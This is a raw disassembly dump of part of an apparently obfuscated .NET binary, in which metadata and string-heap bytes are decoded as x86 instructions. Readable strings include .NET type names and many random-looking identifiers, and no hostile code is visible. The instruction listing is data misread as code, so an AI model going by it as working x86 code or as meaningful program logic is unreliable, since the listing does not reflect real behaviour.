100025f7:	00 07                	add    %al,(%edi)
100025f9:	08 21                	or     %ah,(%ecx)
100025fb:	06                   	push   %es
100025fc:	06                   	push   %es
100025fd:	00 be 05 21 06 06    	add    %bh,0x6062105(%esi)
10002603:	00 80 03 76 05 06    	add    %al,0x6057603(%eax)
10002609:	00 a1 08 33 02 06    	add    %ah,0x6023308(%ecx)
1000260f:	00 75 06             	add    %dh,0x6(%ebp)
10002612:	33 02                	xor    (%edx),%eax
10002614:	06                   	push   %es
10002615:	00 c1                	add    %al,%cl
10002617:	00 21                	add    %ah,(%ecx)
10002619:	06                   	push   %es
1000261a:	0e                   	push   %cs
1000261b:	00 b7 03 07 07 06    	add    %dh,0x6070703(%edi)
10002621:	00 ac 00 20 03 06 00 	add    %ch,0x60320(%eax,%eax,1)
10002628:	28 06                	sub    %al,(%esi)
1000262a:	21 06                	and    %eax,(%esi)
1000262c:	06                   	push   %es
1000262d:	00 d5                	add    %dl,%ch
1000262f:	05 33 02 00 00       	add    $0x233,%eax
10002634:	00 00                	add    %al,(%eax)
10002636:	e8 00 00 00 00       	call   0x1000263b
1000263b:	00 01                	add    %al,(%ecx)
1000263d:	00 01                	add    %al,(%ecx)
1000263f:	00 81 01 10 00 1e    	add    %al,0x1e001001(%ecx)
10002645:	01 1e                	add    %ebx,(%esi)
10002647:	01 41 00             	add    %eax,0x0(%ecx)
1000264a:	01 00                	add    %eax,(%eax)
1000264c:	01 00                	add    %eax,(%eax)
1000264e:	0b 01                	or     (%ecx),%eax
10002650:	10 00                	adc    %al,(%eax)
10002652:	13 02                	adc    (%edx),%eax
10002654:	00 00                	add    %al,(%eax)
10002656:	51                   	push   %ecx
10002657:	00 01                	add    %al,(%ecx)
10002659:	00 09                	add    %cl,(%ecx)
1000265b:	00 0b                	add    %cl,(%ebx)
1000265d:	01 10                	add    %edx,(%eax)
1000265f:	00 27                	add    %ah,(%edi)
10002661:	02 00                	add    (%eax),%al
10002663:	00 51 00             	add    %dl,0x0(%ecx)
10002666:	05 00 09 00 03       	add    $0x3000900,%eax
1000266b:	01 10                	add    %edx,(%eax)
1000266d:	00 12                	add    %dl,(%edx)
1000266f:	00 00                	add    %al,(%eax)
10002671:	00 41 00             	add    %al,0x0(%ecx)
10002674:	17                   	pop    %ss
10002675:	00 09                	add    %cl,(%ecx)
10002677:	00 06                	add    %al,(%esi)
10002679:	00 ef                	add    %ch,%bh
1000267b:	07                   	pop    %es
1000267c:	33 00                	xor    (%eax),%eax
1000267e:	06                   	push   %es
1000267f:	00 56 02             	add    %dl,0x2(%esi)
10002682:	33 00                	xor    (%eax),%eax
10002684:	06                   	push   %es
10002685:	00 9d 01 cf 00 06    	add    %bl,0x600cf01(%ebp)
1000268b:	00 f5                	add    %dh,%ch
1000268d:	02 cf                	add    %bh,%cl
1000268f:	00 06                	add    %al,(%esi)
10002691:	00 14 03             	add    %dl,(%ebx,%eax,1)
10002694:	cf                   	iret
10002695:	00 06                	add    %al,(%esi)
10002697:	00 d3                	add    %dl,%bl
10002699:	06                   	push   %es
1000269a:	d2 00                	rolb   %cl,(%eax)
1000269c:	06                   	push   %es
1000269d:	00 83 02 d2 00 06    	add    %al,0x600d202(%ebx)
100026a3:	00 b7 08 d2 00 06    	add    %dh,0x600d208(%edi)
100026a9:	00 9d 02 d5 00 06    	add    %bl,0x600d502(%ebp)
100026af:	00 df                	add    %bl,%bh
100026b1:	02 d5                	add    %ch,%dl
100026b3:	00 06                	add    %al,(%esi)
100026b5:	00 99 03 d5 00 06    	add    %bl,0x600d503(%ecx)
100026bb:	00 c8                	add    %cl,%al
100026bd:	00 d5                	add    %dl,%ch
100026bf:	00 06                	add    %al,(%esi)
100026c1:	00 6a 00             	add    %ch,0x0(%edx)
100026c4:	d5 00                	aad    $0x0
100026c6:	06                   	push   %es
100026c7:	00 84 00 d5 00 06 00 	add    %al,0x600d5(%eax,%eax,1)
100026ce:	cb                   	lret
100026cf:	02 d5                	add    %ch,%dl
100026d1:	00 06                	add    %al,(%esi)
100026d3:	00 13                	add    %dl,(%ebx)
100026d5:	07                   	pop    %es
100026d6:	d5 00                	aad    $0x0
100026d8:	06                   	push   %es
100026d9:	00 a4 07 d8 00 06 00 	add    %ah,0x600d8(%edi,%eax,1)
100026e0:	3a 08                	cmp    (%eax),%cl
100026e2:	d8 00                	fadds  (%eax)
100026e4:	06                   	push   %es
100026e5:	00 b7 01 33 00 06    	add    %dh,0x6003301(%edi)
100026eb:	00 76 01             	add    %dh,0x1(%esi)
100026ee:	33 00                	xor    (%eax),%eax
100026f0:	06                   	push   %es
100026f1:	00 53 08             	add    %dl,0x8(%ebx)
100026f4:	33 00                	xor    (%eax),%eax
100026f6:	06                   	push   %es
100026f7:	00 58 00             	add    %bl,0x0(%eax)
100026fa:	33 00                	xor    (%eax),%eax
100026fc:	06                   	push   %es
100026fd:	00 a6 06 db 00 00    	add    %ah,0xdb06(%esi)
10002703:	00 00                	add    %al,(%eax)
10002705:	00 80 00 91 20 74    	add    %al,0x74209100(%eax)
1000270b:	03 e2                	add    %edx,%esp
1000270d:	00 01                	add    %al,(%ecx)
1000270f:	00 00                	add    %al,(%eax)
10002711:	00 00                	add    %al,(%eax)
10002713:	00 80 00 91 20 c7    	add    %al,-0x38df6f00(%eax)
10002719:	07                   	pop    %es
1000271a:	ee                   	out    %al,(%dx)
1000271b:	00 08                	add    %cl,(%eax)
1000271d:	00 00                	add    %al,(%eax)
1000271f:	00 00                	add    %al,(%eax)
10002721:	00 80 00 91 20 c2    	add    %al,-0x3ddf6f00(%eax)
10002727:	03 00                	add    (%eax),%eax
10002729:	01 12                	add    %edx,(%edx)
1000272b:	00 00                	add    %al,(%eax)
1000272d:	00 00                	add    %al,(%eax)
1000272f:	00 80 00 91 20 8e    	add    %al,-0x71df6f00(%eax)
10002735:	08 05 01 13 00 50    	or     %al,0x50001301
1000273b:	20 00                	and    %al,(%eax)
1000273d:	00 00                	add    %al,(%eax)
1000273f:	00 96 00 c5 05 10    	add    %dl,0x1005c500(%esi)
10002745:	01 18                	add    %ebx,(%eax)
10002747:	00 00                	add    %al,(%eax)
10002749:	00 00                	add    %al,(%eax)
1000274b:	00 80 00 91 20 66    	add    %al,0x66209100(%eax)
10002751:	08 17                	or     %dl,(%edi)
10002753:	01 1a                	add    %ebx,(%edx)
10002755:	00 00                	add    %al,(%eax)
10002757:	00 00                	add    %al,(%eax)
10002759:	00 80 00 91 20 62    	add    %al,0x62209100(%eax)
1000275f:	03 20                	add    (%eax),%esp
10002761:	01 1f                	add    %ebx,(%edi)
10002763:	00 0c 22             	add    %cl,(%edx,%eiz,1)
10002766:	00 00                	add    %al,(%eax)
10002768:	00 00                	add    %al,(%eax)
1000276a:	93                   	xchg   %eax,%ebx
1000276b:	00 27                	add    %ah,(%edi)
1000276d:	00 27                	add    %ah,(%edi)
1000276f:	01 21                	add    %esp,(%ecx)
10002771:	00 7a 24             	add    %bh,0x24(%edx)
10002774:	00 00                	add    %al,(%eax)
10002776:	00 00                	add    %al,(%eax)
10002778:	86 18                	xchg   %bl,(%eax)
1000277a:	2d 07 06 00 21       	sub    $0x21000607,%eax
1000277f:	00 82 24 00 00 00    	add    %al,0x24(%edx)
10002785:	00 83 00 96 00 2b    	add    %al,0x2b009600(%ebx)
1000278b:	01 21                	add    %esp,(%ecx)
1000278d:	00 00                	add    %al,(%eax)
1000278f:	00 01                	add    %al,(%ecx)
10002791:	00 ef                	add    %ch,%bh
10002793:	07                   	pop    %es
10002794:	00 00                	add    %al,(%eax)
10002796:	02 00                	add    (%eax),%al
10002798:	3d 02 00 00 03       	cmp    $0x3000002,%eax
1000279d:	00 86 01 00 00 04    	add    %al,0x4000001(%esi)
100027a3:	00 01                	add    %al,(%ecx)
100027a5:	00 00                	add    %al,(%eax)
100027a7:	00 05 00 f7 06 00    	add    %al,0x6f700
100027ad:	00 06                	add    %al,(%esi)
100027af:	00 d5                	add    %dl,%ch
100027b1:	07                   	pop    %es
100027b2:	02 00                	add    (%eax),%al
100027b4:	07                   	pop    %es
100027b5:	00 04 01             	add    %al,(%ecx,%eax,1)
100027b8:	00 00                	add    %al,(%eax)
100027ba:	01 00                	add    %eax,(%eax)
100027bc:	b8 02 00 00 02       	mov    $0x2000002,%eax
100027c1:	00 44 01 00          	add    %al,0x0(%ecx,%eax,1)
100027c5:	00 03                	add    %al,(%ebx)
100027c7:	00 2f                	add    %ch,(%edi)
100027c9:	06                   	push   %es
100027ca:	00 00                	add    %al,(%eax)
100027cc:	04 00                	add    $0x0,%al
100027ce:	3d 02 00 00 05       	cmp    $0x5000002,%eax
100027d3:	00 e3                	add    %ah,%bl
100027d5:	02 00                	add    (%eax),%al
100027d7:	00 06                	add    %al,(%esi)
100027d9:	00 d5                	add    %dl,%ch
100027db:	07                   	pop    %es
100027dc:	00 00                	add    %al,(%eax)
100027de:	07                   	pop    %es
100027df:	00 03                	add    %al,(%ebx)
100027e1:	02 00                	add    (%eax),%al
100027e3:	00 08                	add    %cl,(%eax)
100027e5:	00 c0                	add    %al,%al
100027e7:	06                   	push   %es
100027e8:	00 00                	add    %al,(%eax)
100027ea:	09 00                	or     %eax,(%eax)
100027ec:	da 05 02 00 0a 00    	fiaddl 0xa0002
100027f2:	6e                   	outsb  %ds:(%esi),(%dx)
100027f3:	02 00                	add    (%eax),%al
100027f5:	00 01                	add    %al,(%ecx)
100027f7:	00 20                	add    %ah,(%eax)
100027f9:	08 00                	or     %al,(%eax)
100027fb:	00 01                	add    %al,(%ecx)
100027fd:	00 ef                	add    %ch,%bh
100027ff:	07                   	pop    %es
10002800:	00 00                	add    %al,(%eax)
10002802:	02 00                	add    (%eax),%al
10002804:	ea 01 00 00 03 00 2d 	ljmp   $0x2d00,$0x3000001
1000280b:	01 00                	add    %eax,(%eax)
1000280d:	00 04 00             	add    %al,(%eax,%eax,1)
10002810:	c8 01 02 00          	enter  $0x201,$0x0
10002814:	05 00 f1 00 00       	add    $0xf100,%eax
10002819:	00 01                	add    %al,(%ecx)
1000281b:	00 a1 02 00 00 02    	add    %ah,0x2000002(%ecx)
10002821:	00 5e 01             	add    %bl,0x1(%esi)
10002824:	00 00                	add    %al,(%eax)
10002826:	01 00                	add    %eax,(%eax)
10002828:	ef                   	out    %eax,(%dx)
10002829:	07                   	pop    %es
1000282a:	00 00                	add    %al,(%eax)
1000282c:	02 00                	add    (%eax),%al
1000282e:	8c 06                	mov    %es,(%esi)
10002830:	00 00                	add    %al,(%eax)
10002832:	03 00                	add    (%eax),%eax
10002834:	75 08                	jne    0x1000283e
10002836:	00 00                	add    %al,(%eax)
10002838:	04 00                	add    $0x0,%al
1000283a:	d7                   	xlat   %ds:(%ebx)
1000283b:	01 00                	add    %eax,(%eax)
1000283d:	00 05 00 04 03 00    	add    %al,0x30400
10002843:	00 01                	add    %al,(%ecx)
10002845:	00 56 02             	add    %dl,0x2(%esi)
10002848:	02 00                	add    (%eax),%al
1000284a:	02 00                	add    (%eax),%al
1000284c:	4a                   	dec    %edx
1000284d:	03 00                	add    (%eax),%eax
1000284f:	00 01                	add    %al,(%ecx)
10002851:	00 ce                	add    %cl,%dh
10002853:	03 09                	add    (%ecx),%ecx
10002855:	00 2d 07 01 00 11    	add    %ch,0x11000107
1000285b:	00 2d 07 06 00 19    	add    %ch,0x19000607
10002861:	00 2d 07 0a 00 29    	add    %ch,0x29000a07
10002867:	00 2d 07 10 00 31    	add    %ch,0x31001007
1000286d:	00 2d 07 10 00 39    	add    %ch,0x39001007
10002873:	00 2d 07 10 00 41    	add    %ch,0x41001007
10002879:	00 2d 07 10 00 49    	add    %ch,0x49001007
1000287f:	00 2d 07 10 00 51    	add    %ch,0x51001007
10002885:	00 2d 07 10 00 59    	add    %ch,0x59001007
1000288b:	00 2d 07 10 00 61    	add    %ch,0x61001007
10002891:	00 2d 07 15 00 69    	add    %ch,0x69001507
10002897:	00 2d 07 10 00 71    	add    %ch,0x71001007
1000289d:	00 2d 07 10 00 79    	add    %ch,0x79001007
100028a3:	00 2d 07 10 00 99    	add    %ch,0x99001007
100028a9:	00 2d 07 06 00 b1    	add    %ch,0xb1000607
100028af:	00 6f 05             	add    %ch,0x5(%edi)
100028b2:	27                   	daa
100028b3:	00 b9 00 ec 06 33    	add    %bh,0x3306ec00(%ecx)
100028b9:	00 b9 00 ab 08 36    	add    %bh,0x3608ab00(%ecx)
100028bf:	00 c1                	add    %al,%cl
100028c1:	00 df                	add    %bl,%bh
100028c3:	00 3c 00             	add    %bh,(%eax,%eax,1)
100028c6:	c9                   	leave
100028c7:	00 aa 05 41 00 c1    	add    %ch,-0x3effbefb(%edx)
100028cd:	00 bb 05 47 00 d1    	add    %bh,-0x2effb8fb(%ebx)
100028d3:	00 af 03 4d 00 91    	add    %ch,-0x6effb2fd(%edi)
100028d9:	00 2d 07 10 00 d9    	add    %ch,0xd9001007
100028df:	00 f1                	add    %dh,%cl
100028e1:	06                   	push   %es
100028e2:	53                   	push   %ebx
100028e3:	00 89 00 3b 03 58    	add    %cl,0x58033b00(%ecx)
100028e9:	00 89 00 8b 03 5e    	add    %cl,0x5e038b00(%ecx)
100028ef:	00 89 00 1c 06 06    	add    %cl,0x6061c00(%ecx)
100028f5:	00 0c 00             	add    %cl,(%eax,%eax,1)
100028f8:	2d 07 06 00 0c       	sub    $0xc000607,%eax
100028fd:	00 87 03 6f 00 e1    	add    %al,-0x1eff90fd(%edi)
10002903:	00 9b 07 75 00 14    	add    %bl,0x14007507(%ebx)
10002909:	00 2d 07 85 00 f9    	add    %ch,0xf9008507
1000290f:	00 dd                	add    %bl,%ch
10002911:	03 8b 00 f9 00 86    	add    -0x79ff0700(%ebx),%ecx
10002917:	08 a8 00 09 01 2d    	or     %ch,0x2d010900(%eax)
1000291d:	07                   	pop    %es
1000291e:	06                   	push   %es
1000291f:	00 09                	add    %cl,(%ecx)
10002921:	01 0f                	add    %ecx,(%edi)
10002923:	08 b6 00 81 00 2d    	or     %dh,0x2d008100(%esi)
10002929:	07                   	pop    %es
1000292a:	06                   	push   %es
1000292b:	00 11                	add    %dl,(%ecx)
1000292d:	01 47 06             	add    %eax,0x6(%edi)
10002930:	bb 00 0c 00 be       	mov    $0xbe000c00,%ebx
10002935:	07                   	pop    %es
10002936:	c0 00 2e             	rolb   $0x2e,(%eax)
10002939:	00 0b                	add    %cl,(%ebx)
1000293b:	00 30                	add    %dh,(%eax)
1000293d:	01 2e                	add    %ebp,(%esi)
1000293f:	00 13                	add    %dl,(%ebx)
10002941:	00 39                	add    %bh,(%ecx)
10002943:	01 2e                	add    %ebp,(%esi)
10002945:	00 1b                	add    %bl,(%ebx)
10002947:	00 58 01             	add    %bl,0x1(%eax)
1000294a:	2e 00 23             	add    %ah,%cs:(%ebx)
1000294d:	00 61 01             	add    %ah,0x1(%ecx)
10002950:	2e 00 2b             	add    %ch,%cs:(%ebx)
10002953:	00 75 01             	add    %dh,0x1(%ebp)
10002956:	2e 00 33             	add    %dh,%cs:(%ebx)
10002959:	00 75 01             	add    %dh,0x1(%ebp)
1000295c:	2e 00 3b             	add    %bh,%cs:(%ebx)
1000295f:	00 75 01             	add    %dh,0x1(%ebp)
10002962:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
10002966:	61                   	popa
10002967:	01 2e                	add    %ebp,(%esi)
10002969:	00 4b 00             	add    %cl,0x0(%ebx)
1000296c:	7b 01                	jnp    0x1000296f
1000296e:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
10002972:	75 01                	jne    0x10002975
10002974:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
10002978:	75 01                	jne    0x1000297b
1000297a:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
1000297e:	93                   	xchg   %eax,%ebx
1000297f:	01 2e                	add    %ebp,(%esi)
10002981:	00 6b 00             	add    %ch,0x0(%ebx)
10002984:	bd 01 2e 00 73       	mov    $0x73002e01,%ebp
10002989:	00 ca                	add    %cl,%dl
1000298b:	01 a3 00 7b 00 14    	add    %esp,0x14007b00(%ebx)
10002991:	02 00                	add    (%eax),%al
10002993:	01 7b 00             	add    %edi,0x0(%ebx)
10002996:	14 02                	adc    $0x2,%al
10002998:	1a 00                	sbb    (%eax),%al
1000299a:	62 00                	bound  %eax,(%eax)
1000299c:	fc                   	cld
1000299d:	05 69 00 7e 00       	add    $0x7e0069,%eax
100029a2:	40                   	inc    %eax
100029a3:	01 03                	add    %eax,(%ebx)
100029a5:	00 74 03 01          	add    %dh,0x1(%ebx,%eax,1)
100029a9:	00 40 01             	add    %al,0x1(%eax)
100029ac:	05 00 c7 07 01       	add    $0x107c700,%eax
100029b1:	00 00                	add    %al,(%eax)
100029b3:	01 07                	add    %eax,(%edi)
100029b5:	00 c2                	add    %al,%dl
100029b7:	03 01                	add    (%ecx),%eax
100029b9:	00 40 01             	add    %al,0x1(%eax)
100029bc:	09 00                	or     %eax,(%eax)
100029be:	8e 08                	mov    (%eax),%cs
100029c0:	01 00                	add    %eax,(%eax)
100029c2:	40                   	inc    %eax
100029c3:	01 0d 00 66 08 01    	add    %ecx,0x1086600
100029c9:	00 40 01             	add    %al,0x1(%eax)
100029cc:	0f 00 62 03          	verr   0x3(%edx)
100029d0:	01 00                	add    %eax,(%eax)
100029d2:	04 80                	add    $0x80,%al
100029d4:	00 00                	add    %al,(%eax)
100029d6:	01 00                	add    %eax,(%eax)
	...
100029e4:	1e                   	push   %ds
100029e5:	01 00                	add    %eax,(%eax)
100029e7:	00 04 00             	add    %al,(%eax,%eax,1)
	...
100029f2:	00 00                	add    %al,(%eax)
100029f4:	c6 00 17             	movb   $0x17,(%eax)
100029f7:	03 00                	add    (%eax),%eax
100029f9:	00 00                	add    %al,(%eax)
100029fb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
10002a06:	00 00                	add    %al,(%eax)
10002a08:	c6 00 21             	movb   $0x21,(%eax)
10002a0b:	06                   	push   %es
10002a0c:	00 00                	add    %al,(%eax)
10002a0e:	00 00                	add    %al,(%eax)
10002a10:	04 00                	add    $0x0,%al
	...
10002a1a:	00 00                	add    %al,(%eax)
10002a1c:	c6 00 e3             	movb   $0xe3,(%eax)
10002a1f:	03 00                	add    (%eax),%eax
10002a21:	00 00                	add    %al,(%eax)
10002a23:	00 03                	add    %al,(%ebx)
10002a25:	00 02                	add    %al,(%edx)
10002a27:	00 04 00             	add    %al,(%eax,%eax,1)
10002a2a:	02 00                	add    (%eax),%al
10002a2c:	05 00 02 00 21       	add    $0x21000200,%eax
10002a31:	00 2e                	add    %ch,(%esi)
10002a33:	00 41 00             	add    %al,0x0(%ecx)
10002a36:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10002a37:	00 43 00             	add    %al,0x0(%ebx)
10002a3a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10002a3b:	00 00                	add    %al,(%eax)
10002a3d:	00 00                	add    %al,(%eax)
10002a3f:	00 00                	add    %al,(%eax)
10002a41:	4c                   	dec    %esp
10002a42:	79 51                	jns    0x10002a95
10002a44:	68 7a 45 72 79       	push   $0x7972457a
10002a49:	63 5a 35             	arpl   %ebx,0x35(%edx)
10002a4c:	32 76 43             	xor    0x43(%esi),%dh
10002a4f:	4a                   	dec    %edx
10002a50:	30 00                	xor    %al,(%eax)
10002a52:	3c 3e                	cmp    $0x3e,%al
10002a54:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
10002a57:	44                   	inc    %esp
10002a58:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
10002a5f:	6c                   	insb   (%dx),%es:(%edi)
10002a60:	61                   	popa
10002a61:	73 73                	jae    0x10002ad6
10002a63:	36 5f                	ss pop %edi
10002a65:	30 00                	xor    %al,(%eax)
10002a67:	3c 54                	cmp    $0x54,%al
10002a69:	64 74 56             	fs je  0x10002ac2
10002a6c:	41                   	inc    %ecx
10002a6d:	74 66                	je     0x10002ad5
10002a6f:	37                   	aaa
10002a70:	70 4c                	jo     0x10002abe
10002a72:	71 66                	jno    0x10002ada
10002a74:	4b                   	dec    %ebx
10002a75:	50                   	push   %eax
10002a76:	68 3e 67 5f 5f       	push   $0x5f5f673e
10002a7b:	49                   	dec    %ecx
10002a7c:	67 59                	addr16 pop %ecx
10002a7e:	54                   	push   %esp
10002a7f:	6a 66                	push   $0x66
10002a81:	4c                   	dec    %esp
10002a82:	55                   	push   %ebp
10002a83:	65 74 43             	gs je  0x10002ac9
10002a86:	78 6f                	js     0x10002af7
10002a88:	64 55                	fs push %ebp
10002a8a:	47                   	inc    %edi
10002a8b:	54                   	push   %esp
10002a8c:	45                   	inc    %ebp
10002a8d:	4b                   	dec    %ebx
10002a8e:	54                   	push   %esp
10002a8f:	5a                   	pop    %edx
10002a90:	63 38                	arpl   %edi,(%eax)
10002a92:	42                   	inc    %edx
10002a93:	7c 36                	jl     0x10002acb
10002a95:	5f                   	pop    %edi
10002a96:	30 00                	xor    %al,(%eax)
10002a98:	41                   	inc    %ecx
10002a99:	77 42                	ja     0x10002add
10002a9b:	66 47                	inc    %di
10002a9d:	4e                   	dec    %esi
10002a9e:	70 35                	jo     0x10002ad5
10002aa0:	31 67 4b             	xor    %esp,0x4b(%edi)
10002aa3:	41                   	inc    %ecx
10002aa4:	72 51                	jb     0x10002af7
10002aa6:	47                   	inc    %edi
10002aa7:	32 31                	xor    (%ecx),%dh
10002aa9:	00 4e 75             	add    %cl,0x75(%esi)
10002aac:	46                   	inc    %esi
10002aad:	68 6f 70 4b 64       	push   $0x644b706f
10002ab2:	35 42 59 75 59       	xor    $0x59755942,%eax
10002ab7:	48                   	dec    %eax
10002ab8:	6b 39 50             	imul   $0x50,(%ecx),%edi
10002abb:	36 68 48 33 30 62    	ss push $0x62303348
10002ac1:	4c                   	dec    %esp
10002ac2:	31 00                	xor    %eax,(%eax)
10002ac4:	53                   	push   %ebx
10002ac5:	7a 4c                	jp     0x10002b13
10002ac7:	46                   	inc    %esi
10002ac8:	78 67                	js     0x10002b31
10002aca:	54                   	push   %esp
10002acb:	44                   	inc    %esp
10002acc:	33 6f 54             	xor    0x54(%edi),%ebp
10002acf:	5a                   	pop    %edx
10002ad0:	72 36                	jb     0x10002b08
10002ad2:	30 54 31 00          	xor    %dl,0x0(%ecx,%esi,1)
10002ad6:	3c 54                	cmp    $0x54,%al
10002ad8:	64 74 56             	fs je  0x10002b31
10002adb:	41                   	inc    %ecx
10002adc:	74 66                	je     0x10002b44
10002ade:	37                   	aaa
10002adf:	70 4c                	jo     0x10002b2d
10002ae1:	71 66                	jno    0x10002b49
10002ae3:	4b                   	dec    %ebx
10002ae4:	50                   	push   %eax
10002ae5:	68 3e 62 5f 5f       	push   $0x5f5f623e
10002aea:	31 00                	xor    %eax,(%eax)
10002aec:	49                   	dec    %ecx
10002aed:	45                   	inc    %ebp
10002aee:	6e                   	outsb  %ds:(%esi),(%dx)
10002aef:	75 6d                	jne    0x10002b5e
10002af1:	65 72 61             	gs jb  0x10002b55
10002af4:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
10002af8:	31 00                	xor    %eax,(%eax)
10002afa:	4c                   	dec    %esp
10002afb:	69 73 74 60 31 00 46 	imul   $0x46003160,0x74(%ebx),%esi
10002b02:	75 6e                	jne    0x10002b72
10002b04:	63 60 32             	arpl   %esp,0x32(%eax)
10002b07:	00 4c 67 63          	add    %cl,0x63(%edi,%eiz,2)
10002b0b:	61                   	popa
10002b0c:	6e                   	outsb  %ds:(%esi),(%dx)
10002b0d:	73 32                	jae    0x10002b41
10002b0f:	6f                   	outsl  %ds:(%esi),(%dx)
10002b10:	65 51                	gs push %ecx
10002b12:	4b                   	dec    %ebx
10002b13:	7a 71                	jp     0x10002b86
10002b15:	65 42                	gs inc %edx
10002b17:	52                   	push   %edx
10002b18:	53                   	push   %ebx
10002b19:	70 58                	jo     0x10002b73
10002b1b:	45                   	inc    %ebp
10002b1c:	59                   	pop    %ecx
10002b1d:	37                   	aaa
10002b1e:	00 67 65             	add    %ah,0x65(%edi)
10002b21:	74 5f                	je     0x10002b82
10002b23:	55                   	push   %ebp
10002b24:	54                   	push   %esp
10002b25:	46                   	inc    %esi
10002b26:	38 00                	cmp    %al,(%eax)
10002b28:	3c 4d                	cmp    $0x4d,%al
10002b2a:	6f                   	outsl  %ds:(%esi),(%dx)
10002b2b:	64 75 6c             	fs jne 0x10002b9a
10002b2e:	65 3e 00 4c 50 4f    	gs add %cl,%ds:0x4f(%eax,%edx,2)
10002b34:	52                   	push   %edx
10002b35:	79 70                	jns    0x10002ba7
10002b37:	79 39                	jns    0x10002b72
10002b39:	51                   	push   %ecx
10002b3a:	4e                   	dec    %esi
10002b3b:	53                   	push   %ebx
10002b3c:	35 62 70 7a 49       	xor    $0x497a7062,%eax
10002b41:	57                   	push   %edi
10002b42:	41                   	inc    %ecx
10002b43:	00 43 4f             	add    %al,0x4f(%ebx)
10002b46:	51                   	push   %ecx
10002b47:	6c                   	insb   (%dx),%es:(%edi)
10002b48:	6a 77                	push   $0x77
10002b4a:	6f                   	outsl  %ds:(%esi),(%dx)
10002b4b:	4a                   	dec    %edx
10002b4c:	35 48 6e 7a 7a       	xor    $0x7a7a6e48,%eax
10002b51:	6d                   	insl   (%dx),%es:(%edi)
10002b52:	54                   	push   %esp
10002b53:	6a 7a                	push   $0x7a
10002b55:	69 42 75 33 56 31 53 	imul   $0x53315633,0x75(%edx),%eax
10002b5c:	42                   	inc    %edx
10002b5d:	00 4c 66 74          	add    %cl,0x74(%esi,%eiz,2)
10002b61:	6d                   	insl   (%dx),%es:(%edi)
10002b62:	6e                   	outsb  %ds:(%esi),(%dx)
10002b63:	68 56 37 6e 6a       	push   $0x6a6e3756
10002b68:	53                   	push   %ebx
10002b69:	65 78 43             	gs js  0x10002baf
10002b6c:	00 44 4a 58          	add    %al,0x58(%edx,%ecx,2)
10002b70:	59                   	pop    %ecx
10002b71:	42                   	inc    %edx
10002b72:	4b                   	dec    %ebx
10002b73:	7a 77                	jp     0x10002bec
10002b75:	56                   	push   %esi
10002b76:	43                   	inc    %ebx
10002b77:	4b                   	dec    %ebx
10002b78:	63 43 33             	arpl   %eax,0x33(%ebx)
10002b7b:	38 41 4f             	cmp    %al,0x4f(%ecx)
10002b7e:	35 67 41 70 46       	xor    $0x46704167,%eax
10002b83:	00 45 61             	add    %al,0x61(%ebp)
10002b86:	4a                   	dec    %edx
10002b87:	4e                   	dec    %esi
10002b88:	59                   	pop    %ecx
10002b89:	4c                   	dec    %esp
10002b8a:	73 73                	jae    0x10002bff
10002b8c:	6f                   	outsl  %ds:(%esi),(%dx)
10002b8d:	77 76                	ja     0x10002c05
10002b8f:	58                   	pop    %eax
10002b90:	36 6c                	ss insb (%dx),%es:(%edi)
10002b92:	45                   	inc    %ebp
10002b93:	79 56                	jns    0x10002beb
10002b95:	39 34 58             	cmp    %esi,(%eax,%ebx,2)
10002b98:	75 43                	jne    0x10002bdd
10002b9a:	4a                   	dec    %edx
10002b9b:	7a 46                	jp     0x10002be3
10002b9d:	00 5a 45             	add    %bl,0x45(%edx)
10002ba0:	78 4f                	js     0x10002bf1
10002ba2:	48                   	dec    %eax
10002ba3:	53                   	push   %ebx
10002ba4:	47                   	inc    %edi
10002ba5:	59                   	pop    %ecx
10002ba6:	64 6f                	outsl  %fs:(%esi),(%dx)
10002ba8:	72 75                	jb     0x10002c1f
10002baa:	39 6f 30             	cmp    %ebp,0x30(%edi)
10002bad:	39 38                	cmp    %edi,(%eax)
10002baf:	4f                   	dec    %edi
10002bb0:	36 63 71 35          	arpl   %esi,%ss:0x35(%ecx)
10002bb4:	48                   	dec    %eax
10002bb5:	00 4c 45 53          	add    %cl,0x53(%ebp,%eax,2)
10002bb9:	54                   	push   %esp
10002bba:	53                   	push   %ebx
10002bbb:	55                   	push   %ebp
10002bbc:	6c                   	insb   (%dx),%es:(%edi)
10002bbd:	45                   	inc    %ebp
10002bbe:	62 37                	bound  %esi,(%edi)
10002bc0:	34 73                	xor    $0x73,%al
10002bc2:	7a 63                	jp     0x10002c27
10002bc4:	48                   	dec    %eax
10002bc5:	00 49 78             	add    %cl,0x78(%ecx)
10002bc8:	4b                   	dec    %ebx
10002bc9:	6d                   	insl   (%dx),%es:(%edi)
10002bca:	73 75                	jae    0x10002c41
10002bcc:	4a                   	dec    %edx
10002bcd:	59                   	pop    %ecx
10002bce:	68 46 5a 35 4d       	push   $0x4d355a46
10002bd3:	66 51                	push   %cx
10002bd5:	38 35 58 67 58 68    	cmp    %dh,0x68586758
10002bdb:	48                   	dec    %eax
10002bdc:	00 54 58 74          	add    %dl,0x74(%eax,%ebx,2)
10002be0:	44                   	inc    %esp
10002be1:	79 6c                	jns    0x10002c4f
10002be3:	75 70                	jne    0x10002c55
10002be5:	59                   	pop    %ecx
10002be6:	45                   	inc    %ebp
10002be7:	51                   	push   %ecx
10002be8:	66 63 4a 48          	arpl   %cx,0x48(%edx)
10002bec:	50                   	push   %eax
10002bed:	4b                   	dec    %ebx
10002bee:	53                   	push   %ebx
10002bef:	72 4f                	jb     0x10002c40
10002bf1:	4f                   	dec    %edi
10002bf2:	77 33                	ja     0x10002c27
10002bf4:	52                   	push   %edx
10002bf5:	49                   	dec    %ecx
10002bf6:	00 4f 49             	add    %cl,0x49(%edi)
10002bf9:	4d                   	dec    %ebp
10002bfa:	71 61                	jno    0x10002c5d
10002bfc:	4d                   	dec    %ebp
10002bfd:	53                   	push   %ebx
10002bfe:	4f                   	dec    %edi
10002bff:	6e                   	outsb  %ds:(%esi),(%dx)
10002c00:	43                   	inc    %ebx
10002c01:	32 71 49             	xor    0x49(%ecx),%dh
10002c04:	68 54 49 00 56       	push   $0x56004954
10002c09:	43                   	inc    %ebx
